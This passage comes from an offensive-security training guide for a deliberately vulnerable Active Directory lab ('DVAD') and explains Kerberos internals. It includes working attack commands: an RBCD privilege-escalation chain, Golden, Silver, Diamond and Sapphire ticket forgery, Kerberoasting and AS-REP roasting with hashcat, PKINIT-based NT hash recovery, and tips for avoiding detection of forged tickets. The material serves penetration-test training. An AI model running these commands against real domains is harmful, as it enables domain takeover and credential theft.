| 1 | DES-CBC-CRC | DES key from password | Deprecated; required `USE_DES_KEY_ONLY` UAC bit |
| 3 | DES-CBC-MD5 | DES | Deprecated |
| 17 | AES128-CTS-HMAC-SHA1-96 | PBKDF2-SHA1, 4096 iters, salt=`<UPCASE-REALM><principal>` | Modern default |
| 18 | AES256-CTS-HMAC-SHA1-96 | Same, 256-bit | Modern default |
| 23 | RC4-HMAC | Key = NT hash directly | Compatibility, attacker's friend |
| 24 | RC4-HMAC-EXP | export-grade | Long obsolete |
| 26 | CAMELLIA128-CTS-CMAC | rarely used | Some MIT setups |

RC4 etype 23 is the attacker's friend: the ticket is encrypted directly
with the NT hash, so when you Kerberoast you crack the NT hash directly.
AES tickets require PBKDF2 derivation; cracking is much slower but still
feasible if the password is weak.

`Rubeus.exe kerberoast /rc4opsec` requests only RC4-capable tickets
specifically (it sets the `etype` field to only contain 23). Newer
Windows defaults to `msDS-SupportedEncryptionTypes` excluding RC4; you
must verify whether the target SPN supports RC4 or you'll only get AES
back.

### The `msDS-SupportedEncryptionTypes` bits

| Bit | Etype |
|---|---|
| 0x01 | DES-CBC-CRC |
| 0x02 | DES-CBC-MD5 |
| 0x04 | RC4-HMAC |
| 0x08 | AES128 |
| 0x10 | AES256 |
| 0x20 | AES256-SK (smart-card / FAST) |

If the attribute is absent or zero, defaults apply (RC4 + AES on a 2008+
DFL forest). Microsoft's hardening guidance for 2025 is to set RC4 off
domain-wide and set the per-account attribute to `0x18` (AES128 + AES256).

---

## 5.12 (Mechanics) Salts

For AES, the **salt** matters:

- **User**: `<UPCASE-REALM><principal>` — e.g., `CORP.LOCALalice`
- **Computer**: `<UPCASE-REALM>host<lowercase-hostname>.<lowercase-realm>`
  — e.g., `CORP.LOCALhostdc01.corp.local`
- **Service** with sAMAccountName ending in `$`: like a computer.

This means an attacker who renames a service account can break AES key
derivation if Windows doesn't re-derive the key (it does, on `setspn -A`
and when the password is changed). Edge cases here have produced bypasses
in the past (the so-called "no-PAC" / "noPac" CVE-2021-42278/42287 chain
hinges on a related principle).

Practically, when generating AES keys for forgery, you must compute the
salt correctly:

```
python3 -c '
from impacket.krb5.crypto import string_to_key
from impacket.krb5.constants import EncryptionTypes
key = string_to_key(EncryptionTypes.aes256_cts_hmac_sha1_96.value,
                    b"DVADlab2024!", b"CORP.LOCALalice")
print(key.contents.hex())
'
```

---

## 5.13 (Mechanics) S4U2Self and S4U2Proxy

### S4U2Self ("Service for User to Self")

A service can ask the KDC: "Give me a TGS *to myself* on behalf of user X,
without X having authenticated." Anyone with a TGT can do this. The result
is a TGS for the calling service that contains the impersonated user's PAC.

```
service -> KDC: TGS-REQ
  padata: PA-FOR-USER { S4UByteArray = user-to-impersonate }
  sname: service's own SPN
  ...

KDC -> service: TGS-REP
  ticket: TGS for service's own SPN, with PAC for user-to-impersonate
```

By itself, this is not a privilege escalation — the ticket only
authenticates back to the same service. Where it becomes useful is as the
input to S4U2Proxy.

The PA-FOR-USER blob includes a checksum that the KDC verifies with the
service's own key. So you need to already control the service principal.

S4U2Self with **NO_AUTH_DATA_REQUIRED** UAC bit on the service: the KDC
omits the PAC. That's another corner case used in some certipy flows.

### S4U2Proxy ("Service for User to Proxy")

The service takes the S4U2Self TGS (or a forwarded TGS) and asks the KDC
for a TGS for a different SPN, claiming "I'm acting on behalf of user X."

```
                S4U2Self
service -> KDC:  TGS-REQ
   sname=service's SPN
   PA-FOR-USER (impersonate Administrator)
                                    -> KDC issues TGS for service, PAC=Admin

                S4U2Proxy
service -> KDC:  TGS-REQ
   sname=cifs/target
   additional-tickets: [the S4U2Self ticket from above]
                                    -> KDC checks msDS-AllowedToDelegateTo
                                       on service for cifs/target
                                       (if TRUSTED_TO_AUTH_FOR_DELEGATION,
                                        protocol-transition is OK; else
                                        the additional ticket must be
                                        FORWARDABLE.)
                                    -> KDC issues TGS for cifs/target,
                                       PAC=Admin
```

**Why this is so attacker-friendly:**

- If you have *any* account with constrained delegation **with protocol
  transition (TrustedToAuthForDelegation)** and a target SPN whitelisted
  to e.g. `cifs/dc01.corp.local`, you can synthesize a TGS impersonating
  *anyone* (including Administrator) to `cifs/dc01.corp.local`. Game over.
- Plain S4U2Proxy without protocol transition still requires a forwardable
  TGT from the user — harder but possible if you can coerce them.

This is also the engine behind **RBCD**: when
`msDS-AllowedToActOnBehalfOfOtherIdentity` on `TARGET$` allows your
computer principal `BAD$`, you can do S4U2Self at `BAD$` (synthesizing a
TGS for Administrator → `BAD$`) then S4U2Proxy to any service on TARGET,
and the KDC issues it. The KDC's check is: "is BAD$ in TARGET's
msDS-AllowedToActOnBehalfOfOtherIdentity?" Yes → grant.

**Sensitive accounts** with `NOT_DELEGATED` UAC bit (0x100000) get TGTs
without `FORWARDABLE`, which breaks the chain. Anyone in the **Protected
Users** group also has `NOT_DELEGATED` semantics applied by default. DA
accounts that *aren't* in Protected Users and don't have NOT_DELEGATED
are the targets.

### A worked RBCD chain

```bash
# Pre-req: alice has GenericWrite on TARGET$ (Bloodhound finds this)
# Step 1: create attacker computer (uses MachineAccountQuota=10)
impacket-addcomputer corp.local/alice:'DVADlab2024!' \
        -computer-name 'BAD$' -computer-pass 'B4dPass!' \
        -dc-ip 10.10.0.10

# Step 2: set RBCD on TARGET$ to allow BAD$
impacket-rbcd corp.local/alice:'DVADlab2024!' \
        -delegate-from 'BAD$' -delegate-to 'TARGET$' \
        -action write -dc-ip 10.10.0.10

# Step 3: S4U2Self+S4U2Proxy to get TGS for cifs/target as Administrator
impacket-getST -spn cifs/target.corp.local \
        -impersonate Administrator \
        corp.local/'BAD$':'B4dPass!' -dc-ip 10.10.0.10

# Step 4: use the ticket
export KRB5CCNAME=Administrator@cifs_target.corp.local@CORP.LOCAL.ccache
impacket-psexec -k -no-pass target.corp.local
```

You're SYSTEM on `target` and you never knew Administrator's password.
RBCD is the most common DVAD ACL-chain payoff.

---

## 5.14 (Mechanics) Referrals across trusts

When alice in `corp.local` wants `cifs/server.finance.local`:

```
alice -> CORP KDC: TGS-REQ for cifs/server.finance.local
                    CORP KDC realises finance.local != CORP, returns a
                    referral TGT encrypted with the inter-realm trust key
                    krbtgt/FINANCE.LOCAL@CORP.LOCAL

alice -> FINANCE KDC: TGS-REQ with the referral TGT as PA-TGS-REQ
                    FINANCE KDC decrypts with its copy of the trust key
                    (krbtgt/FINANCE.LOCAL@CORP.LOCAL on FINANCE side),
                    sees PAC, applies SID filtering policy,
                    issues TGS for cifs/server.finance.local
```

This is where **SID filtering** kicks in: when FINANCE KDC decrypts the
referral PAC, it inspects ExtraSids and either honors or strips them based
on `trustAttributes` and the `dwAttributes` bits set when the trust was
created.

DVAD's `corp.local <-> finance.local` external trust intentionally has
SID filtering **disabled** (via `netdom trust /quarantine:no`), allowing
SID history injection: forge a ticket in CORP with FINANCE's EA SID in
ExtraSids, present it to FINANCE — KDC honors it. That's `DF-001`.

Forest trusts default to SID filtering enabled and only allow SIDs that
match the trusted forest's domain SID prefixes. Disabling SID filtering on
a forest trust requires `netdom trust /enablesidhistory:yes` and explicit
attribute changes. DVAD's `corp.local <-> root.corp` forest trust also has
filtering relaxed to enable `DF-005`.

---

## 5.15 (Mechanics) FAST (Kerberos armoring)

**FAST (Flexible Authentication Secure Tunneling, RFC 6113)** wraps
Kerberos exchanges inside an armored tunnel that prevents offline password
cracking of pre-auth blobs. Modern Windows supports it; deploying it (via
the "Kerberos client support for claims, compound authentication and
Kerberos armoring" GPO) on member computers requires AES support and a
DFL of 2012+.

When FAST is active:

- The AS-REQ's PA-ENC-TIMESTAMP is encrypted under a **temporary session
  key** derived from the computer account's TGT (the "armor TGT"),
  not the user's long-term key.
- AS-REP roasting is defeated because the ciphertext returned isn't
  encrypted under the user's password derivative.
- Kerberoast is partially defeated for service tickets requested via
  FAST-capable clients, but the service ticket itself still uses the
  service account's key, so kerberoasting from a non-FAST client still
  works.

DVAD does **not** enable FAST. AS-REP roasting and Kerberoasting work
because of it.

---

## 5.16 (Mechanics) PKINIT — certificate-based Kerberos

Instead of pre-auth via password, the client signs a timestamp with a
**certificate private key** and includes the public cert. The KDC
validates the cert chain (must chain to a cert in the `NTAuthCertificates`
container in the Configuration NC), extracts the principal name from the
cert (UPN extension or SAN, depending on `CertificateMappingMethods`),
and issues a TGT.

```
AS-REQ with PA-PK-AS-REQ:
  signedAuthPack: signed by client's private key
    pkAuthenticator (cusec, ctime, nonce, paChecksum)
    clientPublicValue (DH, optional)
  cert: client cert
  ...

AS-REP with PA-PK-AS-REP:
  TGT (krbtgt-encrypted)
  encKeyPack: server's signed reply, contains the new session key
  (or DH key agreement output)
```

This is what ADCS-cert-based attacks rely on. If you can get a cert from
an ESC1/ESC8/ESC11/etc. template with an arbitrary
`subjectAltName.userPrincipalName`, you can PKINIT as that user. **Even if
the user's password has been rotated**, your cert still authenticates —
until either the cert expires or admins revoke and add to `NTAUTH-CRL`.

DVAD's CRED-022..035 all exploit PKINIT.

### Recovering NT hash via PKINIT + U2U

The PKINIT response also enables you to retrieve the user's **NTLM hash**
via the `PAC_CREDENTIAL_INFO` buffer. The flow: PKINIT-authenticate to get
a TGT, then exchange it for a TGS *to yourself* with U2U (User-to-User)
flag set. The DC returns a service ticket encrypted with your TGT's
session key. Inside is `PAC_CREDENTIAL_INFO` with the user's NT hash,
encrypted with the session key — which you have, so you decrypt:

```
certipy auth -pfx alice.pfx -domain corp.local -dc-ip 10.10.0.10
# Output: ... NT hash: a4f49c40...
```

After getting a cert as Administrator (via ESC1, etc.), you can recover
their NT hash and pivot to NTLM/SMB/RDP. This is the bridge from "ADCS
compromise" to "I have the krbtgt NT hash and Administrator's NT hash."

### Strong cert binding (KB5014754)

Post-May 2022, DCs validate that the cert maps to the **expected** AD
account, using the `altSecurityIdentities` attribute or the cert's serial
number. Three modes via `StrongCertificateBindingEnforcement`:

- 0 = Disabled (vulnerable).
- 1 = Compatibility (warn but allow weak mapping).
- 2 = Full (require strong mapping).

DVAD uses mode 1 for the lab so ESC9/ESC10 are exploitable. Production
must be at mode 2 by Feb 2025 (per Microsoft's enforcement timeline).

---

## 5.17 (Mechanics) U2U (User-to-User)

A special TGS exchange where the "service" is itself a user, and the TGS
is encrypted with that user's session key instead of a long-term key. The
flag `ENC-TKT-IN-SKEY` is set, and the TGS-REQ carries the "service's"
TGT as an additional-ticket.

Used in:

- **Certipy auth** — for retrieving NT hash via PKINIT (PKCA + U2U).
- **PetitPotam coercion + relay** scenarios — manipulating who "the
  service" is for forwarding flows.
- **MSCASRV (Microsoft Cluster Service)** and other peer-to-peer Kerberos.

Don't worry about reading U2U packets byte-for-byte; understand it exists
so you can recognise the `additional-tickets` field in TGS-REQs.

---

## 5.18 (Mechanics) Kerberos delegation flags revisited

Flags in `userAccountControl`:

- `TRUSTED_FOR_DELEGATION` (0x80000) — unconstrained delegation. Service
  receives forwarded TGTs in AP-REQs (clients embed their TGT in the
  authenticator's `enc-authorization-data`).
- `TRUSTED_TO_AUTH_FOR_DELEGATION` (0x1000000) — constrained delegation
  with protocol transition. Service can S4U2Self without a forwardable
  TGT from the user.
- `NOT_DELEGATED` (0x100000) — set on sensitive accounts to mean "never
  delegate this user." Domain admins should have this.

Plus attributes:

- `msDS-AllowedToDelegateTo` — target SPN list for constrained delegation
  (sits on the *delegating* service account). Multivalued, contains SPN
  strings like `cifs/target.corp.local`.
- `msDS-AllowedToActOnBehalfOfOtherIdentity` — security descriptor whose
  ACL grants principals the right to "act on behalf of this account."
  Sits on the *target* computer. RBCD's home.

### The delegation matrix

| Source has | Target accepts via | Need from user |
|---|---|---|
| Unconstrained | (TGT-in-AP-REQ pass-through) | User must hit source, leaking TGT |
| Constrained (no protocol transition) | msDS-AllowedToDelegateTo set on source for target SPN | Forwardable TGT from user (cookie or other channel) |
| Constrained with protocol transition | Same; TRUSTED_TO_AUTH_FOR_DELEGATION on source | Nothing — S4U2Self forges |
| RBCD | msDS-AllowedToActOnBehalfOfOtherIdentity on target lists source | Nothing — S4U2Self at source |

The RBCD row is what makes the world-readable `msDS-AllowedToActOnBehalfOfOtherIdentity`
attribute so dangerous: writing it grants take-over.

---

## 5.19 (Mechanics) Ticket forms — Golden/Silver/Diamond/Sapphire

| Name | Forged by | Encrypted with | Detection profile |
|---|---|---|---|
| **Silver** | Service account's NT hash (or AES key) | Service account's key | Hard — service doesn't talk to DC. Hash compromise often unknown. |
| **Golden** | krbtgt's NT hash | krbtgt's key | Trivial offline forgery once you DCSync krbtgt. PAC values may be inconsistent with the real account state — DCs may detect anomalies (lifetime, missing PAC types after KB5008380/5020805). |
| **Diamond** | (real TGT, modify PAC) | Real krbtgt key (asked KDC for legit TGT first) | Harder to detect than Golden because the TGT was actually issued, but PAC manipulation may leave traces. Defeated by Ticket Checksum (KB5008380). |
| **Sapphire** | (PAC extracted from S4U2Self) | Real krbtgt key, real PAC | Even harder — uses a real PAC the KDC generated, just for a different principal. Subverts checksum validation because every signature is genuine. |

A **Golden Ticket workflow** in mimikatz:

```
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /user:krbtgt              # get krbtgt's NT hash
mimikatz # kerberos::golden /user:Administrator \
                  /domain:corp.local /sid:S-1-5-21-... \
                  /krbtgt:<nt> /id:500 /ptt
mimikatz # misc::cmd                                # cmd with the ticket
PS C:\> dir \\dc01.corp.local\C$                   # now SYSTEM on the DC
```

A **Diamond Ticket** workflow (Rubeus):

```
Rubeus.exe diamond /tgtdeleg /user:Administrator \
             /krbkey:<aes256> /ticketuser:Administrator \
             /ticketuserid:500 \
             /groups:512,513,518,519,520
```

`/tgtdeleg` extracts a real TGT (using unconstrained-style trick on the
current user's session), then replaces the PAC. Output ticket has a real
nonce, real authtime, and a forged PAC re-signed with the supplied
krbkey.

A **Sapphire Ticket** workflow:

```
Rubeus.exe sapphire /user:targetuser \
             /krbkey:<krbtgt aes256> \
             /ticketuser:Administrator /ticketuserid:500
```

Sapphire requests S4U2Self at the calling service to *get* the
target user's PAC (real PAC, real signatures from the KDC), then wraps
it into a forged TGT signed with the krbtgt key. The PAC is byte-for-byte
what the KDC would produce.

### Lifetimes and detection

mimikatz defaults to a 10-year ticket lifetime. Real TGTs are 10h.
Detection: any 4769 event referencing a TGT with a 10-year lifetime is a
golden ticket. Always specify `/endin:600` or similar.

Also, the krbtgt's `pwdLastSet` and the ticket's `authtime` must be
consistent — if krbtgt rotated yesterday and your ticket claims to have
been issued last week, your ticket is a forgery. mimikatz `/startoffset:`
can backdate, but newer DCs may reject implausible offsets.

---

## 5.20 (Mechanics) Time and clock skew

KDC tickets carry timestamps. Service hosts validate the authenticator's
timestamp against their clock, with a tolerance window (default 5 min).
If you're more than 5 min off, Kerberos breaks. This is why:

- AD relies on NTP (and the PDC Emulator is the authoritative time source).
- Attacker boxes must sync to the DC's clock for Kerberos to work.

```bash
sudo ntpdate 10.10.0.10
# or
sudo chronyd -q 'server 10.10.0.10 iburst'
# or (one-shot, no daemon)
sudo rdate -n 10.10.0.10
```

A common DVAD beginner failure is "tools work yesterday, fail today" —
check your clock first. The error from impacket on skew is typically
`KRB_AP_ERR_SKEW (Clock skew too great)`. From Rubeus,
`KRB_AP_ERR_SKEW`. From SSPI (Windows-side), error 0x8009030C
`SEC_E_CLOCK_SKEW`.

---

## 5.21 (Mechanics) ccache and KRB5CCNAME

On Linux, Kerberos tickets are stored in **credential caches**, default
location `/tmp/krb5cc_<uid>`. impacket tools read from `KRB5CCNAME`:

```bash
export KRB5CCNAME=/tmp/alice.ccache
impacket-getTGT corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10
# (writes alice.ccache by default in cwd; rename or set KRB5CCNAME)

klist -c /tmp/alice.ccache       # inspect: which principals, lifetimes

impacket-psexec -k -no-pass dc01.corp.local                # uses KRB5CCNAME
nxc smb dc01.corp.local --use-kcache                       # NetExec equivalent
```

On Windows, ccaches live in LSASS; access via `klist`, `Rubeus.exe ptt`,
mimikatz `kerberos::list /export`.

To convert formats:

```bash
ticketConverter.py alice.ccache alice.kirbi   # ccache <-> kirbi
```

### The /etc/krb5.conf you'll want

```ini
[libdefaults]
    default_realm = CORP.LOCAL
    dns_lookup_kdc = false
    dns_lookup_realm = false
    rdns = false
    ticket_lifetime = 10h
    renew_lifetime = 7d
    forwardable = true
    udp_preference_limit = 0

[realms]
    CORP.LOCAL = {
        kdc = 10.10.0.10
        admin_server = 10.10.0.10
    }
    FINANCE.LOCAL = {
        kdc = 10.20.0.10
        admin_server = 10.20.0.10
    }
    ROOT.CORP = {
        kdc = 10.30.0.10
        admin_server = 10.30.0.10
    }

[domain_realm]
    .corp.local = CORP.LOCAL
    corp.local  = CORP.LOCAL
    .finance.local = FINANCE.LOCAL
    finance.local  = FINANCE.LOCAL
    .root.corp = ROOT.CORP
    root.corp  = ROOT.CORP
```

`udp_preference_limit = 0` forces TCP, which avoids the "AS-REP too big
for UDP" failure with AES tickets (very common in DVAD).

---

## 5.22 (Mechanics) Operator-side ticket parsing

When you've captured a ccache, you want to know what's in it:

```bash
impacket-describeTicket alice.ccache
```

Output (abbreviated):

```
[*] Service Ticket: cifs/file01.corp.local@CORP.LOCAL
    Encryption: AES256
    Flags: forwardable, renewable, pre_authent
    Auth time: 2025-...
    End time: 2025-... + 10h
    Renew till: 2025-... + 7d
[*] PAC LOGON_INFO:
    EffectiveName: alice
    PrimaryGroupId: 513
    GroupIds: [513, 1107, 1213, ...]
    UserId: 1106
    LogonDomainName: CORP
    LogonDomainId: S-1-5-21-...
    UserFlags: 0x20
    UserAccountControl: 0x210 (NORMAL_ACCOUNT)
    ExtraSids: []
[*] PAC SERVER_CHECKSUM: type=12 (HMAC-SHA1-96 AES256) bytes=...
[*] PAC KDC_CHECKSUM: type=15 (HMAC-SHA1-96 AES256) bytes=...
```

Use it to:

- Confirm a ticket has the groups you expected (after RBCD S4U2Proxy).
- Find SID history in `ExtraSids` (cross-forest forged tickets).
- Diagnose "why doesn't this ticket work?" issues (often: wrong realm
  case, wrong cname encoding, or stale PAC after KB5020805).

---

## 5.23 (Mechanics) NetExec / impacket / Rubeus auth flags reference

Every Kerberos-capable tool has its own dialect. Cheat sheet:

| Tool | Use password | Use NT hash | Use ticket | Use AES key |
|---|---|---|---|---|
| `impacket-*` | `DOMAIN/user:pass@host` | `-hashes :NT host` | `-k -no-pass` + KRB5CCNAME | `-aesKey <hex>` |
| `nxc` | `-u user -p pass` | `-u user -H NT` | `--use-kcache` | `--aesKey <hex>` |
| `evil-winrm` | `-u user -p pass` | `-u user -H NT` | `-r REALM` + KRB5CCNAME | n/a (use ticket) |
| `Rubeus.exe asktgt` | `/password:pass` | `/rc4:NT` | n/a | `/aes256:KEY` |
| `Rubeus.exe ptt` | n/a | n/a | `/ticket:base64` | n/a |
| `setspn / mssqlclient` | depends on platform | depends | depends | rarely |

Always force the auth mode you want with `-k` (Kerberos) or
`--use-kcache`. impacket auto-falls-back to NTLM if Kerberos fails, which
sometimes masks bugs.

---

## 5.24 (Mechanics) MS-NRPC and the ZeroLogon corner case

The Netlogon Remote Protocol (MS-NRPC) is the third major auth channel,
used between computers and DCs to validate machine-account secure
channels. The setup involves a Diffie-Hellman-style negotiation seeded by
the computer's password derivative.

CVE-2020-1472 (ZeroLogon) discovered that NRPC's AES-CFB8 mode handling
had a degenerate case: when the IV is all zeros and the plaintext is all
zeros, the ciphertext is also all zeros with non-trivial probability
(1/256 per byte → 1/2^8 attempts to hit per session). The attacker
brute-forces by spamming auth requests with zero IV+plaintext.

When the attacker succeeds, they can use the established secure channel
to **reset any computer's machine-account password to empty**. Resetting
the DC's machine password effectively gives the attacker the DC.

Patch: KB4565351 (August 2020) — DCs reject CFB8 with predictable IVs.
Enforcement mode (`FullSecureChannelProtection=1`) was activated by
February 2021's cumulative.

DVAD sets `FullSecureChannelProtection=0` and accepts NRPC with
predictable IV to allow ZeroLogon — `PE-021`.

---

## 5.25 (Mechanics) HTTP Negotiate (SPNEGO) and the browser path

Web servers accepting Kerberos use SPNEGO:

```
Browser request to http://intranet/
Server -> 401 Unauthorized, WWW-Authenticate: Negotiate
Browser -> obtains TGS for HTTP/intranet.corp.local
Browser -> sends Authorization: Negotiate YII... (GSS-API blob)
Server -> validates AP-REQ in the blob, 200 OK
```

SPNEGO can also wrap NTLM. The Authorization blob header is the same; the
inner OID changes.

Why this matters offensively:

- **HTTP coercion** points (e.g., printer web pages, WebDAV) can be
  triggered to authenticate, then their NTLM blob relayed.
- **Kerberos relay over HTTP** was, until 2022, considered "not a thing"
  by Microsoft. James Forshaw and others showed it is possible by abusing
  the lack of channel binding in HTTP-Kerberos. NTLMrelayX and
  KrbRelayUp implement this. Highly DC-specific.
- **HTTP/* SPN squatting:** if a web service runs as a user with an SPN
  `HTTP/intranet.corp.local`, that user is Kerberoastable.

---

## 5.26 (Mechanics) Negotiate, CredSSP, and the double-hop problem

**Negotiate** is Microsoft's SSPI provider that wraps either Kerberos
(preferred) or NTLM (fallback). Most user-mode tools (PowerShell remoting,
RDP, SMB) speak Negotiate.

**CredSSP** is the *credential delegation* provider, used by RDP and by
PowerShell `-Authentication CredSSP`. It forwards the user's plaintext
password (encrypted with the server's TLS public key) to the remote host
so the remote host can then perform a fresh Kerberos AS-REQ on the user's
behalf. This solves the "double-hop" problem of plain Kerberos (which
doesn't forward credentials by default).

The cost: the remote host now has the plaintext password in memory.
LSASS dump → plaintext. So CredSSP is convenient *and* terrible for
security. PowerShell session-level configuration `Enable-WSManCredSSP
-Role Server` lets you target which destinations clients may delegate to
(`AllowFreshCredentials*` GPOs).

**The double-hop problem without CredSSP:**

```
You ---WinRM--> ServerA ---SMB---> ServerB
   (Kerberos)         ServerA tries to act as you to ServerB, but
                      its TGS is for HTTP/ServerA, not transferable.
                      Result: anonymous logon to ServerB -> Access denied.
```

Solutions:

1. **CredSSP** (as above).
2. **Resource-based constrained delegation** from ServerA to ServerB
   (configured on ServerB).
3. **Constrained delegation with protocol transition** on ServerA.
4. **Just pass an explicit credential** in your PowerShell commands.

The PowerShell idiom that bypasses the problem when you have plaintext:

```powershell
$cred = New-Object PSCredential 'corp\alice',
        (ConvertTo-SecureString 'DVADlab2024!' -AsPlainText -Force)
Invoke-Command -ComputerName ServerB -Credential $cred -ScriptBlock { ... }
# Run this Invoke-Command FROM inside the WinRM session on ServerA
```

---

## Lab exercises

### Exercise 5.A — Capture an AS-REQ with Wireshark

Filter `kerberos`. Run from your attacker box:

```bash
impacket-getTGT corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10
```

Find the AS-REQ. Identify:

- `cname` (alice).
- `realm` (CORP.LOCAL).
- `etype` (which encryption types alice's client offered).
- `padata` (the encrypted timestamp).
- The corresponding AS-REP: `ticket.enc-part` (krbtgt-encrypted) and
  `enc-part` (alice-encrypted, outer).

Now try `impacket-getTGT corp.local/alice -hashes :a4f49c40...` and
observe whether the AS-REQ etype list changes.

### Exercise 5.B — AS-REP roast

In DVAD, certain users have `DONT_REQ_PREAUTH`. Identify them:

```bash
impacket-GetNPUsers corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10 \
        -request
```

Look at the captured hash format: `$krb5asrep$23$user@DOMAIN:salt$ct`.
Crack with hashcat mode 18200:

```bash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```

If a user has AES-only preauth disabled (rare), `-request` returns
`$krb5asrep$17$...` or `$18$...`; crack with 19600/19700.

### Exercise 5.C — Kerberoast

```bash
impacket-GetUserSPNs corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10 \
        -request -outputfile kerb.hash
hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt
```

`13100` is hashcat's Kerberos TGS-REP RC4 mode. Identify which DVAD
service account cracks first. Now try forcing AES with
`-supplied-realm CORP.LOCAL -request-user svc_iis` and see what changes
in the output format. Crack with mode 19700.

### Exercise 5.D — Look at the PAC

After getting a TGT:

```bash
impacket-describeTicket alice.ccache
```

Find the `LogonInfo` PAC buffer. See your RID, your group memberships,
ExtraSids (empty for now). Note the LogonServer (which DC issued?). Note
the PasswordLastSet timestamp.

### Exercise 5.E — Cross-forest referral observation

```bash
impacket-getTGT corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10
KRB5CCNAME=alice.ccache impacket-getST \
        -spn cifs/dc01.finance.local \
        -k -no-pass \
        corp.local/alice -dc-ip 10.10.0.10
```

In Wireshark, watch for two TGS-REPs: one from CORP (the referral) and
one from FINANCE (the actual service ticket). Identify the
`krbtgt/FINANCE.LOCAL@CORP.LOCAL` principal in the referral.

### Exercise 5.F — Forge a Silver Ticket

After dumping NTDS in Chapter 10, take `FILE01$`'s hash and forge a
silver ticket for `cifs/file01.corp.local`:

```bash
impacket-ticketer \
        -nthash <FILE01$ hash> \
        -domain-sid S-1-5-21-... \
        -domain corp.local \
        -spn cifs/file01.corp.local \
        -user-id 500 Administrator

export KRB5CCNAME=Administrator.ccache
smbclient -k //file01.corp.local/C$
```

No DC contact required to use the ticket. This is the silent power of
Silver. Now check the DC's 4769 log — there shouldn't be one for this
session, only the 4624 on FILE01.

### Exercise 5.G — Forge a Golden Ticket

After DCSync of krbtgt:

```bash
impacket-ticketer \
        -nthash <krbtgt hash> \
        -domain-sid S-1-5-21-... \
        -domain corp.local \
        -user-id 500 Administrator
# (no -spn => TGT, not TGS)

export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass dc01.corp.local
```

Now look at the DC's 4769 events: one per service ticket request. The
4768 (TGT) is absent — that's the golden ticket signature.

### Exercise 5.H — Diamond Ticket via Rubeus

Run on a Windows attacker box:

```
Rubeus.exe diamond /tgtdeleg /user:Administrator \
            /krbkey:<aes256_krbtgt> \
            /ticketuser:Administrator /ticketuserid:500 \
            /groups:512,513,518,519,520
```

`/tgtdeleg` requires the current user to have a TGT (any user; even a
low-priv user works). Rubeus extracts a real TGT and replaces the PAC.
The output is a forgeable-but-with-real-cipher TGT.

### Exercise 5.I — RBCD chain

Practice the full RBCD chain from §5.13. Set `MachineAccountQuota = 0` on
the domain via Domain Admin, then try again — observe failure at the
`addcomputer` step. That's the **one-line fix** for RBCD.

### Exercise 5.J — Kerberos clock skew failure

Set your attacker box's clock 10 minutes off:

```bash
sudo date -s "$(date -d '10 min ago')"
impacket-getTGT corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10
# Should fail: KRB_AP_ERR_SKEW
sudo ntpdate 10.10.0.10
impacket-getTGT corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10
# Should succeed.
```

This 15-minute exercise saves hours of "why doesn't it work" debugging.

---

## Self-check questions

1. What's stored in the NT hash, and what's its input?
2. What's the difference between an NT hash (stored) and a NetNTLMv2
   (over the wire)?
3. Why is NTLM relay possible at the protocol level?
4. What two SMB signing options matter for relay, and which one does DVAD
   disable?
5. What does the "krbtgt" account do, and what would happen if you reset
   its password twice?
6. Walk through the AS-REQ / AS-REP exchange. Where do the two keys
   (user's, krbtgt's) come in?
7. Walk through TGS-REQ / TGS-REP. Where does the service account's key
   come in?
8. What is the PAC, and what are its checksums for? Name the four
   signature types and which patch introduced each.
9. What's the difference between S4U2Self and S4U2Proxy?
10. Why does RBCD subvert the traditional "configure constrained
    delegation on the source" model?
11. Why is an AS-REP roastable hash crackable but a Kerberoasted hash for
    a long random password effectively uncrackable?
12. What is PKINIT and what's special about it for persistence?
13. What's the maximum clock skew Kerberos tolerates, and what happens
    beyond it?
14. What's the difference between Golden, Silver, Diamond, and Sapphire
    tickets?
15. Why does SID filtering matter for cross-forest attacks?
16. What is FAST and what does enabling it prevent?
17. What does `NOT_DELEGATED` do, and what's the equivalent for group
    membership?
18. Why does `MachineAccountQuota = 0` kill the RBCD chain?
19. What is `msDS-SupportedEncryptionTypes`, and how does it interact
    with the etype field in TGS-REQ?
20. What does U2U enable that plain TGS-REP does not?

---

## References

- **RFC 4120** — The Kerberos Network Authentication Service (V5). The
  canonical spec.
- **RFC 4556** — PKINIT.
- **RFC 6113** — FAST armoring.
- **RFC 6806** — Kerberos Cross-Realm Routing.
- **MS-KILE** — Microsoft's Kerberos extensions (the "long tail" of
  Windows-specific behavior).
- **MS-PAC** — PAC data structure.
- **MS-NLMP** — NTLM Authentication Protocol.
- **MS-NRPC** — Netlogon (relevant for ZeroLogon).
- **MS-SFU** — S4U extensions to KILE.
- **harmj0y — *S4U2Pwnage*** — the classic constrained delegation post.
- **Elad Shamir — *Wagging the Dog*** — the seminal RBCD writeup. Read
  this in full.
- **SpecterOps — *Certified Pre-Owned*** — PKINIT/ADCS deep dive (the
  ESC1..N paper).
- **Snir Ben Shimol — *Diamond Tickets*** — the post that introduced the
  technique.
- **Charlie Bromberg — *Pixis ticket guide*** — practical reference.
- **Microsoft — KB5008380** — PAC ticket signature.
- **Microsoft — KB5020805** — Extended KDC signature.
- **Microsoft — KB5014754** — Strong certificate binding.

Next: [06-pki-and-adcs.md](06-pki-and-adcs.md).
